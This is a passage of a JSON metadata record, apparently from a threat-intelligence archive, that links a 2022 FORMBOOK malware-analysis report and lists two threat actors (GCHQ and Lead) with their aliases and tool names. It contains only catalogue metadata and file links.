        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-18 - FORMBOOK Adopts CAB-less Approach.pdf"
    ],
    "report_names": [
        "2022-01-18 - FORMBOOK Adopts CAB-less Approach.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535792,
    "ts_updated_at": 1743041321,
    "ts_creation_date": 1653693656,
    "ts_modification_date": 1653693656,
    "files": {
        "pdf": "https://archive.orkl.eu/2de51bab9ac81f2a1ac0cbd297a32a1f66117744.pdf",
        "text": "https://archive.orkl.eu/2de51bab9ac81f2a1ac0cbd297a32a1f66117744.txt",
        "img": "https://archive.orkl.eu/2de51bab9ac81f2a1ac0cbd297a32a1f66117744.jpg"
    }
}